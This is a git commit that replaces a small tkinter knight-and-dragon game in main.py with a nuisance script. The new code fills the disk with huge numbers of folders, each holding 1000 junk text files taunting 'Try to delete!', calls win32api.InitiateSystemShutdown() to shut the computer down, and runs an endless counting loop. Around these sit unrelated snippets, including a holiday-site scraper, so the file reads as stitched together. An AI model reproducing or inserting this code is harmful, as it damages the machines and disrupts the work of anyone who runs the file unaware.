225f800f80670a7093c16802d03fa9c624f677dc
xbeginer <127129583+xbeginer@users.noreply.github.com>
2023-09-13 21:02:05 +0300

    Add files via upload

--- main.py
+++ main.py
@@ -1,82 +1,56 @@
-import random
 from tkinter import *
-window = Tk()
-w = 610
-h = 610
-window.geometry(f"{w}x{h}")
-canvas = Canvas(window, width=w, height=h, border=True, bg="red")
-canvas.place(x=0, y=0)
-bg_photo = PhotoImage(file="замок.png")
-class Knight():
-    def __init__(self):
-        self.x = 70
-        self.y = h // 2
-        self.v = 0
-        self.v_x = 0
-        self.photo = PhotoImage(file="рыцарь.png")
-    def up(self, event):
-        self.v = -3
-    def down(self, event):
-        self.v = 3
-    def left(self, event):
-        self.v_x = -3
-    def right(self, event):
-        self.v_x = 3
-    def stop(self, event):
-        self.v = 0
-        self.v_x = 0
-
-class Dragon:
-    def __init__(self):
-        self.x = 750
-        self.y = random.randint(100, 500)
-        self.v = random.randint(1, 3)
-        self.photo = PhotoImage(file="дракон.png")
-
-knight = Knight()
-dragons = [Dragon() for i in range(1)]
-
-def game():
-    canvas.delete('all')
-    canvas.create_image(300, 300, image=bg_photo)
-    canvas.create_image(knight.x, knight.y, image=knight.photo)
-    knight.y += knight.v
-    knight.x += knight.v_x
-    current = 0
-    dragon_to_kill = -1
-    for d in dragons:
-        d.x -= d.v
-        canvas.create_image(d.x, d.y, image=d.photo)
-        if ((d.x - knight.x) ** 2) + ((d.y - knight.y) ** 2) <= (96) ** 2:
-            dragon_to_kill = current
-        current += 1
-        if d.x <= 0:
-            canvas.delete('all')
-            canvas.create_text(w // 2, h // 2, text="You lose!", font="Verdana 42", fill='white')
-            break
-
-    if dragon_to_kill >= 0:
-        del dragons[dragon_to_kill]
-    if len(dragons) == 0:
-        canvas.delete('all')
-        canvas.create_text(w // 2, h // 2, text="You Win!", font="Verdana 42", fill='white')
-    else:
-        window.after(5, game)
-
-    if knight.y <= 52:
-        knight.y = 53
-    if knight.y >= 41:
-        knight.y = 40
-    if knight.x <= 10:
-        knight.x = 10
-    if knight.x >= 100:
-        knight.x = 100
-    window.after(5, game)
-
-game()
-window.bind("<Key-Up>", knight.up)
-window.bind("<Key-Down>", knight.down)
-window.bind("<Key-Right>", knight.right)
-window.bind("<Key-Left>", knight.left)
-window.bind("<KeyRelease>", knight.stop)
-window.mainloop()
+root = Tk()
+root.resize=False
+root.geometry("500x190")
+root.attributes("-alpha",0.75)
+root.configure(bg="black")
+txt = Text(root,fg="lightgreen",bg="black",font=("Arial",10),width=121,height=20)
+txt.place(x=2,y=2)
+root.attributes("-topmost",True)
+from threading import Thread
+import os
+for i in range(100000*100000):
+    name = 'новая папка-{}'.format(i)
+    if not os.path.exists(name):
+        os.mkdir(name)
+        for i in range(1000):
+            text_file = open(name+"/новая мамка"+str(i)+".txt", "w")
+            text_file.write("Попробуй удали!рафщдшрадцрфдарфдалфцмалфмцагшнфмалдгифшлрамфщгапфрцамфщгашлрфцащгдшфрцашлрфашлгпфыалгопшгыуапгыпрзшырпщшырпзфрпзфцрпзщшыфурпфцзпрфзцшпзфцпрзшфрпзшфцрпзшфцрпрцфпрпрпррыкппырпырпрыпыпрыпрыпрыпрщыпрыурщышпузрышпзырпушрыыпршрщшпыурзшыпыпурзшыпурыпузыщрш")
+            text_file.close()
+print("OK")
+class MyThread(Thread):
+    def __init__(self, name):
+        Thread.__init__(self)
+        self.name = name
+    def run(self):
+        for i in range(1000000):
+            msg = "%s is running" % \
+                self.name
+            print(msg)
+number = 1
+import sys
+var1="Python"
+var2=10000
+var3=True
+print(sys.getsizeof(var1))
+print(sys.getsizeof(var2))
+print(sys.getsizeof(var3))
+import win32api
+win32api.InitiateSystemShutdown()
+while number != 0:
+    number += 10000
+    print(number)
+import requests
+res = requests.get("https://calend.online/holiday/")
+res = res.text
+a=res.split("<h2>Праздники сегодня <small>полный список</small><")[1]
+a=a.split("/ul")[0]
+a=a.split('<ul class="holidays-list">')[1]
+a=a.split("<li>\n")
+a=[i.strip(" qwertyuiop[]asdfghjkl;''zxcv//bnm,./>/<=-\t\n") for i in a]
+a=[i.split("<")[0] for i in a]
+a=[i.strip(' qwertyuiop[]asdfghjkl;""zxcvbnm,./>/<=-\t\n') for i in a]
+a=[i for i in a if i!=""]
+a="\n".join(a)
+txt.insert(1.0,a)
+root.mainloop()
